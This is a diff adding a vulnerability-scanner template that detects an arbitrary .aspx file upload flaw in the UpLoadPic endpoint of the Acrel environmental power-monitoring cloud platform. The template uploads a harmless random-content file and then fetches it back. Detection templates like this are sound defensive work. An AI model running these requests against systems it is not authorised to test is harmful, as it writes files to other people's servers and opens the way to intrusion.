@@ -1,0 +1,65 @@
+id: poc-yaml-acreldny-uploadpic-anyfile-upload
+
+info:
+  name: 安科瑞环保用电监管云平台 UpLoadPic 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in 安科瑞环保用电监管云平台, specifically in the UpLoadPic endpoint.
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Enterprise/UpLoadPic"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRDazwgc1RnTaskmR
+    body: |-
+      ------WebKitFormBoundaryRDazwgc1RnTaskmR
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+
+      {{t2}}
+      ------WebKitFormBoundaryRDazwgc1RnTaskmR--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"status\":true"
+          - ".aspx"
+        condition: and
+      - type: regex
+        part: body
+        regex:
+          - "/UpLoad/Temp/([0-9a-z]{32}).aspx"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "/UpLoad/Temp/(?P<file>[0-9a-z]{32}).aspx"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/UpLoad/Temp/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
